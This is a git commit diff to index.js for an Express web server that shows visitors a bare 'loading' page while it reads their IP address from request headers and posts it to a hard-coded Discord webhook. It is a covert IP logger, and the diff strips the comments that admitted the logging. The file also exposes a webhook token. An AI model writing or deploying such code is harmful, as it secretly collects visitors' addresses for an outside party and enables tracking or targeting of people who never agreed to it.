498146708755b4eb70b081243dda9a96833470bb
play-station451 <playstation451discord@gmail.com>
2025-11-22 17:08:51 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,20 +1,16 @@
 const express = require('express');
-const fetch = require('node-fetch'); // or use native fetch in Node 18+
 const app = express();
 
 const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1441910971583955096/lB5pL8eiU_UccEKYVt11qdh3Jp1HaG4kNlnPR87q1slqf3tdiXUIREIrVYsz7ZiW44gV';
 
 app.get('/', async (req, res) => {
-    // Get user's IP address
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress).split(',')[0].trim();
 
-    // Notify user their IP is being logged
-    res.send(`
-        <h1>loading</h1>
-    `);
+    res.send('<h1>loading</h1>');
 
-    // Send IP to Discord webhook
     try {
+        const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
+
         await fetch(DISCORD_WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
